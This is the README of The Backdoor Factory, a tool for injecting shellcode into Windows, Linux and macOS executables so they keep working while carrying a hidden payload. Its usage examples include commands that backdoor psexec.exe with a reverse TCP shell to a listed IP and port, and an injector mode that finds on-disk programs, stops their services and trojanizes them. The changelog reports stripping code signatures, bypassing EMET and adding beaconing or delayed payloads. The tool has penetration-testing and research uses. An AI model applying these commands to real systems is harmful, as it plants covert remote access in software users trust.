##The Backdoor Factory (BDF)
For security professionals and researchers only.

The goal of BDF is to patch executable binaries with user desired shellcode and continue normal execution of the prepatched state.

Supporting: 

    Windows PE x86/x64,ELF x86/x64 (System V, FreeBSD, ARM Little Endian x32), 
    and Mach-O x86/x64 and those formats in FAT files
    
    Packed Files: PE UPX x86/x64
    
    Experimental: OpenBSD x32 


Some executables have built in protections, as such this will not work on all binaries.  It is advisable that you test target binaries before deploying them to clients or using them in exercises.  I'm on the verge of bypassing NSIS, so bypassing these checks will be included in the future.

    Many thanks to Ryan O'Neill --ryan 'at' codeslum <d ot> org--
    Without him, I would still be trying to do stupid things 
    with the elf format.
    Also thanks to Silvio Cesare with his 1998 paper 
    (http://vxheaven.org/lib/vsc01.html) which these ELF patching
    techniques are based on.

./backdoor.py -h 
    Usage: backdoor.py [options]

##Features:

###PE Files

    Can find all codecaves in an EXE/DLL.
    By default, clears the pointer to the PE certificate table, thereby unsigning a binary.
    Can inject shellcode into code caves or into a new section.
    Can find if a PE binary needs to run with elevated privileges.
    When selecting code caves, you can use the following commands:
      -Jump (j), for code cave jumping
      -Single (s), for patching all your shellcode into one cave
      -Append (a), for creating a code cave
      -Ignore (i), nevermind, ignore this binary
    Can ignore DLLs.
    Import Table Patching
    AutoPatching

###ELF Files

    Extends 1000 bytes (in bytes) to the TEXT SEGMENT and injects shellcode into that section of code.

###Mach-O Files
    Pre-Text Section patching and signature removal

###Overall
    
    The user can :
      -Provide custom shellcode.
      -Patch a directory of executables/dlls.
      -Select x32 or x64 binaries to patch only.
      -Include BDF is other python projects see pebin.py and elfbin.py

Sample Usage:

###Patch an exe/dll using an existing code cave:

    ./backdoor.py -f psexec.exe -H 192.168.0.100 -P 8080 -s reverse_shell_tcp 

    [*] In the backdoor module
    [*] Checking if binary is supported
    [*] Gathering file info
    [*] Reading win32 entry instructions
    [*] Looking for and setting selected shellcode
    [*] Creating win32 resume execution stub
    [*] Looking for caves that will fit the minimum shellcode length of 402
    [*] All caves lengths:  (402,)
    ############################################################
    The following caves can be used to inject code and possibly
    continue execution.
    **Don't like what you see? Use jump, single, append, or ignore.**

###Patch a directory of exes:
    ./backdoor.py -d test/ -i 192.168.0.100 -p 8080 -s reverse_shell_tcp -a
    ...output too long for README...

###User supplied shellcode:
    msfpayload windows/exec CMD='calc.exe' R > calc.bin
    ./backdoor.py -f psexec.exe -s user_supplied_shellcode -U calc.bin
    This will pop calc.exe on a target windows workstation. So 1337. Much pwn. Wow.

###Hunt and backdoor: Injector | Windows Only
    The injector module will look for target executables to backdoor on disk.  It will check to see if you have identified the target as a service, check to see if the process is running, kill the process and/or service, inject the executable with the shellcode, save the original file to either file.exe.old or another suffix of choice, and attempt to restart the process or service.  
    Edit the python dictionary "list_of_targets" in the 'injector' module for targets of your choosing.

    ./backdoor.py -i -H 192.168.0.100 -P 8080 -s reverse_shell_tcp -a -u .moocowwow

###Changelog

####4/14/2014

So many updates:
  * Automatic patching for PE files (use -m automatic with a *_threaded payload)
  
  * New IAT payloads for x86/x64 PE files

  * Just watch: https://www.youtube.com/watch?v=kkLI_ur6BxY

####2/14/2014
I <3 you guys

* Added Import Address Table patching for PEs to support iat_reverse_tcp payloads that 
use the import table for winAPI calls. If the binary you are patching does not
have LoadLibraryA and GetProcAddress, for example, BDF will patch it in to a 
new Import Table in a new section. Supports x64/x86 PEs.

* Added iat_reverse_tcp for x64 PEs.

* Bug fixes and improvements

####1/1/2015

Happy New Year!

Two new OS X payloads! The delay: delay_reverse_shell_tcp

-B 30 --> delay the payload for 30 seconds, main code runs right away.

Setting of firm capstone commit for building into BDF, capstone 'Next' repo
breaks BDF.

Fixes to support cython capstone implementation null byte truncation issue


####12/27/2014

Added payloadtests.py

This script will output patched files in backdoored that will allow for the user to 
test the payloads as they wish. Each payload type increments the port used
by one.


    Usage: payloadtest.py binary HOST PORT
  

####12/17/2014

OS X Beaconing Payloads for x86 and x64: beaconing_reverse_shell_tcp 

-B 15  --> set beacon time for 15 secs

Bug fix to support OS X for BDFProxy



####10/11/2014

PE UPX Patching Added



####9/26/2014

Mach-O x86/x64 added

x86 IAT payload optimization



####7/31/2014 

Added support for ARM x32 LE ELF patching



####7/22/2014 

Added FreeBSD x32 ELF patching support

Change to BSD 3 Clause License



####7/13/2014 

Incorporated Capstone: http://www.capstone-engine.org/

During the process of adding Capstone, I removed about 500 lines of code. That's pretty awesome.

Renamed loadliba_reverse_tcp to iat_reverse_tcp.

Small optimizations for speed.



####5/30/2014 

Added a new win86 shellcode: loadliba_reverse_tcp
    
  - Based on the following research by Jared DeMott: http://bromiumlabs.files.wordpress.com/2014/02/bypassing-emet-4-1.pdf -- Thanks @bannedit0 for mentioning this.
  - This shellcode uses LoadLibraryA and GetProcessAddress APIs to find all necessary APIs for a reverse TCP connection. No more of Stephen Fewers API hash lookup (which is still brilliant).
  - It's not stealthy. It's position dependent. But the results are great (code cave jumping): https://www.virustotal.com/en/file/a31ed901abcacd61a09a84157887fc4a189d3fe3e3573c24e776bac8d5bb8a0f/analysis/1401385796/
  - Bypasses EMET 4.1. The caller protection doesn't catch it.
  - As such, I'll be furthering this idea with an algo that patches the binary with custom shellcode based on the APIs that are in the IAT. Including porting the current win86 shellcodes to this idea.
